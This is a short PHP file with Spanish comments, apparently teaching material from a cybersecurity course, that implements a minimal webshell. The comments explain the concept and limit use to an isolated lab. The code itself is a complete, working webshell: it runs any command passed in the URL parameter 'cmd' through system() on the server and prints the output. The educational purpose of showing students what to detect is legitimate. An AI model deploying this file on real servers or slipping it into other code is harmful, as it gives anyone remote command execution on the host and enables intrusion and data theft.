<?php
// webshell.php -- MINI webshell de laboratorio (demostracion educativa).
// Una "webshell" es un archivo que un atacante deja en tu servidor web y que le
// da una consola remota: cada visita a su URL ejecuta un comando en la maquina.
//
// Funcionamiento (a proposito, minimo, para entenderlo):
//   - recibe un comando por el parametro ?cmd=... de la URL
//   - lo ejecuta EN EL SERVIDOR con system()
//   - devuelve la salida dentro de un <pre> para leerla comoda
//
// SOLO para el laboratorio aislado y propio. Subir esto a un servidor ajeno es
// ilegal. Se muestra para que aprendas a DETECTARLO y a IMPEDIR la subida.
// Morini Computers -- Ciberseguridad. Encuadre educativo y de defensa.
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);   // ejecuta en el servidor el comando que llega por la URL
    echo "</pre>";
}
?>
